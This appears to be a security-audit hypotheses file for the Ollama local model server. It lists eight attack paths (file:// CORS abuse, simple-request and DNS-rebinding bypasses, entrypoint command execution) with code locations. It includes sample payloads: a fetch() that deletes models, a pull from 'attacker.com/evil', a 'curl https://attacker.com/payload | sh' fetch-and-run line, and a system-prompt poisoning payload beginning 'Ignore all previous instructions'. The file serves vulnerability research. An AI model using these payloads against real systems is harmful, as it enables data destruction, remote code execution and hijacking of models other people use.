# Round 1 Hypotheses — backward-reasoner-04
# Method: Pre-Mortem / Backward Reasoning (start from catastrophic outcome, trace backward to preconditions)

## PH-01: Full Model Deletion via file:// CORS (gin path, rc==nil)

**Reasoning model**: Pre-Mortem
**Outcome assumed**: Attacker deletes all locally stored models from victim's machine
**Working backward**:
- DELETE /api/delete succeeds on server → gin's DeleteHandler called
- DeleteHandler requires: valid JSON body with model name, no auth
- gin middleware passes: CORS allows file://* origin, Host=localhost passes
- Browser sends DELETE with JSON body from file:// page
- Precondition: browser sends `Origin: <file-url>` not `Origin: null`

**Hypothesis**: When the Ollama server starts WITHOUT a registry client (`rc == nil`), a malicious HTML file opened in the browser can send `DELETE /api/delete` with `Content-Type: application/json` body to `http://localhost:11434`. The gin-cors middleware will process the preflight and, if `file://*` matches the browser's actual Origin header, will emit `Access-Control-Allow-Origin` on the preflight response, enabling the browser to send the actual DELETE request. All locally stored models can be deleted.

**Attack input**: HTML file containing:
```javascript
fetch('http://localhost:11434/api/delete', {
  method: 'DELETE',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({model: 'llama3.2'})
})
```

**Code path**:
- `envconfig/config.go:100-106` — AllowedOrigins appends `file://*`
- `server/routes.go:1664` — corsConfig.AllowOrigins = envconfig.AllowedOrigins()
- `server/routes.go:1668-1671` — gin.Use(cors.New(corsConfig), allowedHostsMiddleware)
- `server/routes.go:1686` — r.DELETE("/api/delete", s.DeleteHandler)
- Sink: `server/routes.go:1055` — DeleteHandler calls model deletion

**Sanitizers on path**:
- `allowedHostsMiddleware`: Host=localhost → `allowedHost("localhost")` returns true → PASSES
- CORS: `file://*` wildcard — **bypassable if browser sends `Origin: file:///path/to/file.html` or `Origin: null` matched by wildcard**
- No authentication

**Critical question**: Does gin-contrib/cors match `file://*` against `Origin: null`? Chrome sends `Origin: null` for file:// pages in some contexts, `Origin: file:///path` in others.

**Security consequence**: All named models deleted; model weights erased; denial of service
**Severity estimate**: HIGH
**Validation status**: VALIDATED (when Origin is not null) / NEEDS-DEEPER (null origin behavior)

---

## PH-02: Arbitrary Model Pull via file:// CORS → Supply-Chain Entry Point

**Reasoning model**: Pre-Mortem
**Outcome assumed**: Victim's machine pulls and stores an attacker-controlled model containing malicious GGUF or (on parth/agents branch) an ENTRYPOINT payload
**Working backward**:
- Model is stored locally → GGUF parsed → (on agents branch) Entrypoint stored in ShowResponse
- `PullModel()` / `s.Client.Pull()` called with attacker-controlled model name
- POST /api/pull accepted by server
- CORS allows file://* origin for /api/pull

**Hypothesis**: A malicious HTML file can POST to `/api/pull` with `{"model": "attacker.com/evil:latest"}`, triggering the server to pull from an attacker-controlled registry. This downloads attacker-supplied GGUF blobs (triggering parser CVE attack surface) and stores the model config (including Entrypoint/MCPRef on parth/agents branch). The victim's machine becomes seeded with the malicious model.

**Attack input**: `{"model": "attacker.com/evil:latest"}` via cross-origin POST

**Code path**:
- `envconfig/config.go:100-106` — file://* in defaults
- `server/routes.go:1681` — r.POST("/api/pull", s.PullHandler)
- `server/routes.go:914-949` — PullHandler: ShouldBindJSON → PullModel()
- OR: `server/internal/registry/server.go:120` — handlePull (rc != nil path, no CORS)
- Sink: registry fetch from attacker.com → blob download → GGUF parse

**Sanitizers on path**:
- Model name validation: `ollama.ErrNameInvalid` format check — does NOT restrict registry hostname
- No registry allowlist check
- CORS: file://* → PASS (same caveats as PH-01)

**Security consequence**: Arbitrary model pulled from attacker registry; GGUF parser exposed to attacker-crafted binary; (agents branch) ENTRYPOINT stored for later execution
**Severity estimate**: CRITICAL (chains into RCE on agents branch; HIGH on main branch via GGUF parser)
**Validation status**: VALIDATED

---

## PH-03: registry.Local /api/pull Bypass — No CORS Headers, Simple-Request Exploitation

**Reasoning model**: Pre-Mortem
**Outcome assumed**: Attacker pulls a model from cross-origin request without any CORS protection
**Working backward**:
- Pull executes server-side → model stored
- POST to /api/pull hits registry.Local.handlePull (rc != nil)
- registry.Local emits NO CORS headers
- Browser sends request — server side executes even if browser blocks response

**Hypothesis**: When `rc != nil`, POST to `/api/pull` is handled by `registry.Local.handlePull` which emits NO CORS headers. For a non-simple cross-origin request (JSON body), the browser sends a preflight OPTIONS first. registry.Local.serveHTTP does not handle OPTIONS for /api/pull (only POST), so the OPTIONS returns 405. Preflight fails → browser blocks the actual POST.

**BUT**: An attacker can bypass the preflight requirement by using a **simple request**:
- Use `Content-Type: text/plain` or `application/x-www-form-urlencoded`  
- The body `{"model":"attacker.com/evil"}` will still be decoded by `decodeUserJSON` if the server doesn't check Content-Type
- OR use `<form method="POST">` with URL-encoded body pointing to a model name

**Attack input**: Form-based POST or fetch with `Content-Type: text/plain` and JSON-like body
**Critical question**: Does `decodeUserJSON` require `Content-Type: application/json`, or will it decode any body?

**Code path**:
- `server/internal/registry/server.go:263-267` — decodeUserJSON[*params](r.Body) — uses `json.NewDecoder(r.Body).Decode()`, does NOT check Content-Type
- Sink: `s.Client.Pull(r.Context(), p.model())` with attacker model name

**Sanitizers on path**:
- decodeUserJSON: checks JSON structure only, not Content-Type — **bypassable** with text/plain simple request

**Security consequence**: Model pulled from attacker registry without CORS preflight restriction; server-side execution; GGUF parser exposed
**Severity estimate**: HIGH (same impact as PH-02 but for rc != nil path)
**Validation status**: VALIDATED (no Content-Type check confirmed in code)

---

## PH-04: DNS Rebinding + registry.Local — Complete Middleware Bypass

**Reasoning model**: Pre-Mortem
**Outcome assumed**: Attacker from any website (not just file://) gains access to /api/delete and /api/pull with NO security controls
**Working backward**:
- handleDelete / handlePull called with attacker data
- registry.Local intercepts request before gin
- Attacker controls request (DNS rebinding + JS)

**Hypothesis**: DNS rebinding attack (attacker controls DNS to rebind `attacker.com` → `127.0.0.1`). Victim's browser navigates to attacker page. After DNS TTL expires, JS makes requests to `attacker.com:11434` which resolves to `127.0.0.1:11434`. The Host header is `attacker.com:11434`. In gin's allowedHostsMiddleware, `allowedHost("attacker.com")` returns false → 403. BUT: registry.Local intercepts `/api/delete` and `/api/pull` BEFORE gin. registry.Local has no Host check. The request executes.

**Attack input**: DNS rebinding + XHR to `http://attacker.com:11434/api/delete` or `/api/pull`

**Code path**:
- DNS rebind: attacker.com:11434 → 127.0.0.1:11434
- `server/internal/registry/server.go:109` — ServeHTTP: r.URL.Path == "/api/delete" → handleDelete
- NO middleware in this path
- Sink: model deletion / model pull

**Sanitizers on path**:
- `allowedHostsMiddleware`: BYPASSED — registry.Local is outermost handler
- CORS: not applicable for same-"origin" DNS rebind
- No auth

**Security consequence**: Model deletion and arbitrary pull via DNS rebinding; previously patched CVE-2024-28224 is partially re-opened for these two endpoints
**Severity estimate**: HIGH (requires DNS rebinding setup; mitigated by 60-second DNS TTL wait)
**Validation status**: VALIDATED (confirmed in registry/server.go code structure)

---

## PH-05: Null Origin from file:// Permits Simple-Request Execution Without CORS Gate

**Reasoning model**: Abductive (explaining observed behavior from first principles)
**Hypothesis**: Chrome and Firefox send `Origin: null` for fetch requests from `file://` pages. The gin-contrib/cors library's wildcard matching for `file://*` applies `filepath.Match`-style pattern matching. `file://*` would match `file:///path/to/page.html` but NOT `null`. 

**Consequence A (if null NOT matched)**: CORS preflight fails for JSON requests from file:// pages → browser blocks; file:// is less dangerous than claimed.

**Consequence B (if null IS matched via AllowWildcard=true)**: Wildcard mode might also accept `null` as matching `file://*` depending on library implementation. Need to check gin-contrib/cors source.

**Consequence C — no-cors mode fallback**: Regardless of CORS, `fetch(url, {mode: 'no-cors'})` sends the request without expecting CORS headers. The browser will NOT allow JS to read the response, but the server EXECUTES the request. For `/api/pull` (server writes to disk) and `/api/delete` (server deletes model), the attacker doesn't need to read the response. The effect is achieved.

**Attack input**: `fetch('http://localhost:11434/api/delete', {mode:'no-cors', method:'DELETE', body:'{"model":"victim-model"}'})`

**BUT**: no-cors mode restricts the request to "simple" methods (GET, POST, HEAD). DELETE is not simple → no-cors DELETE is blocked.

**Refined attack**: Use POST /api/delete or equivalent, OR use the fact that gin routes also register the old delete path.

**Security consequence**: The file:// CORS vector may be more nuanced than binary; no-cors mode opens a different angle for POST-based destructive endpoints
**Severity estimate**: MEDIUM
**Validation status**: NEEDS-DEEPER (requires testing gin-contrib/cors null origin behavior)

---

## PH-06: ENTRYPOINT Experimental-Flag Non-Enforcement (parth/agents branch)

**Reasoning model**: Pre-Mortem
**Outcome assumed**: A non-experimental user running `ollama run <model>` triggers arbitrary command execution from a pulled model's Entrypoint
**Working backward**:
- `exec.Command(entrypoint, args...).Run()` called
- `runEntrypoint(opts)` called
- `opts.Entrypoint != ""` is true (model has entrypoint)
- User ran `ollama run <pulled-model>` WITHOUT `--experimental` flag

**Hypothesis**: In `cmd/cmd.go`, `isExperimental` is retrieved at line 748 via `cmd.Flags().GetBool("experimental")`. The `runEntrypoint()` call is at approximately line 535, which is reached by EVERY `ollama run` execution when the model has a non-empty Entrypoint. The `isExperimental` check at line 779 only gates `xcmd.GenerateInteractive` (the interactive agent loop). The entrypoint execution is NOT gated by `isExperimental`. A normal user running `ollama run malicious-agent` without `--experimental` will still execute the entrypoint.

**Attack input**: Any pulled model config with `Entrypoint: "curl https://attacker.com/payload | sh"` (stored in ConfigV2 OCI blob)

**Code path** (parth/agents branch):
- `cmd/cmd.go:669-685` — client.Show() → info.Entrypoint
- `cmd/cmd.go:506` — opts.Entrypoint = info.Entrypoint
- `cmd/cmd.go:535-536` — if opts.Entrypoint != "" { return runEntrypoint(opts) }
- `cmd/cmd.go:584-626` — runEntrypoint: strings.Fields() → exec.LookPath() → exec.Command().Run()
- `cmd/cmd.go:748` — isExperimental retrieved BUT never used to gate line 535

**Sanitizers on path**:
- `isExperimental` flag: retrieved but NOT checked at line 535 — **not a sanitizer**
- `exec.LookPath()`: resolves command path but does not restrict what can be executed
- No allowlist, no sandbox, no user confirmation

**Security consequence**: Supply-chain RCE; arbitrary OS command execution with user privileges on `ollama run`
**Severity estimate**: CRITICAL
**Validation status**: VALIDATED (confirmed by KB analysis; code on parth/agents branch)

---

## PH-07: $PROMPT Whitespace Injection into ENTRYPOINT Arguments

**Reasoning model**: Pre-Mortem
**Outcome assumed**: User input via CLI prompt alters the command structure of the ENTRYPOINT subprocess
**Working backward**:
- `strings.Fields(cmd)` produces unexpected argument list
- `cmd` = result of `strings.Replace(entrypoint, "$PROMPT", userPrompt, 1)`
- userPrompt contains whitespace tokens

**Hypothesis**: An entrypoint like `mytool --query $PROMPT --safe-flag` with user prompt `innocent-query --dangerous-flag` produces:
```
strings.Replace → "mytool --query innocent-query --dangerous-flag --safe-flag"
strings.Fields  → ["mytool", "--query", "innocent-query", "--dangerous-flag", "--safe-flag"]
```
The `--safe-flag` is still present but `--dangerous-flag` has been injected. For many CLI tools, attacker-controlled flags (e.g., `--exec`, `-e`, `--config=/dev/stdin`) can escalate privilege or change behavior.

More critically: if prompt contains shell metacharacters AND the entrypoint is `bash -c $PROMPT`, the entire prompt becomes a shell command.

**Attack input**: User prompt: `; curl https://attacker.com/payload | sh #`

**Security consequence**: Argument injection into subprocess; potential RCE escalation if entrypoint is a shell or accepts dangerous flags
**Severity estimate**: HIGH (requires specific entrypoint patterns; but trivial for `bash -c $PROMPT` style)
**Validation status**: VALIDATED (structural — strings.Replace before strings.Fields is definitively wrong)

---

## PH-08: Cross-Origin /api/create Model Poisoning

**Reasoning model**: Pre-Mortem
**Outcome assumed**: Attacker creates a model with malicious system prompt or template via cross-origin request
**Working backward**:
- POST /api/create executes → model stored with attacker-controlled system prompt
- gin CreateHandler called
- CORS allows file://* → preflight succeeds

**Hypothesis**: A malicious HTML file can POST to `/api/create` with a crafted Modelfile body that overrides the system prompt of an existing model (e.g., `llama3.2`) with attacker-controlled content, causing all future user interactions to be poisoned. Combined with the pull vector, this creates persistent compromise.

**Attack input**: 
```json
{"model": "llama3.2", "from": "llama3.2", "system": "Ignore all previous instructions..."}
```

**Code path**:
- `server/routes.go:1695` — r.POST("/api/create", s.CreateHandler)
- CORS: file://* → PASS
- allowedHostsMiddleware: Host=localhost → PASS
- CreateHandler: creates new model variant with attacker system prompt

**Sanitizers on path**: 
- No authorization check on create endpoint
- Model name collision: can overwrite existing model by same name

**Security consequence**: Model behavior poisoning; persistent system prompt injection across all future model invocations
**Severity estimate**: HIGH
**Validation status**: VALIDATED
